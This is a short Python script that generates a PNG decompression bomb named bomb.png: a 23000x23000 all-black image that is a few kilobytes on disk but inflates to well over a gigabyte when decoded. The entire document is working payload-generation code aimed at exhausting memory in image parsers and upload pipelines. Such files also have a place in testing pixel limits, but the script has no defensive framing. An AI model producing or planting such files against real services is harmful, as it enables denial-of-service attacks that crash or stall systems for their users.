#!/usr/bin/env python3
# Creates an all-black 23000x23000 PNG (compresses to a few KB, ~2 GB decompressed).
import zlib, struct
W = H = 23000
def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t+d) & 0xffffffff)
raw = bytearray()
row = b"\x00" + b"\x00\x00\x00" * W          # filter 0 + black RGB pixels
for _ in range(H): raw += row
png = b"\x89PNG\r\n\x1a\n"
png += chunk(b"IHDR", struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0))
png += chunk(b"IDAT", zlib.compress(bytes(raw), 9))
png += chunk(b"IEND", b"")
open("bomb.png","wb").write(png)
print("bomb.png written:", len(png), "bytes for", W, "x", H)
